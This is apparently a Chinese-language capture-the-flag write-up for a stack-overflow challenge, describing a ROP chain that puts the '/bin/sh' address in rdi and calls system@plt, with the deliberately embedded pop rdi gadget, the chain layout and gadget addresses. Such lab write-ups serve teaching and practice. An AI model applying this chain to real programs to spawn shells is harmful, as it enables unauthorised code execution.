# WP：05-rop-chain

## 题目信息

- 类型：ROP chain → system("/bin/sh")
- 保护：No PIE、No Canary、NX
- 端口：13375

## 分析

程序没有 `win()` 函数，但有 `system@plt` 和 `/bin/sh` 字符串。需要构造 ROP chain：

1. 把 `/bin/sh` 地址放进 `rdi`（x86-64 第一个参数）
2. 调用 `system()`

## 为什么需要手动嵌入 gadget

现代 gcc（ubuntu 22.04）编译时不再生成 `__libc_csu_init`，导致二进制里没有 `pop rdi; ret` gadget。

题目在源码中用内联汇编手动嵌入了这个 gadget：

```c
__asm__(".text\n"
        ".global my_gadget\n"
        "my_gadget:\n"
        "  pop %rdi\n"
        "  ret\n");
```

## ROP Chain

```
[0x28 padding] [ret] [pop_rdi] ["/bin/sh" addr] [system@plt]
```

`ret` 用于栈对齐（system 内部有 SSE 指令要求 16 字节对齐）。

## 关键地址

| 符号 | 地址 |
|------|------|
| my_gadget (pop rdi; ret) | 0x401196 |
| system@plt | 0x401090 |
| "/bin/sh" (.rodata) | 0x402004 |
| ret gadget | 0x40101a |
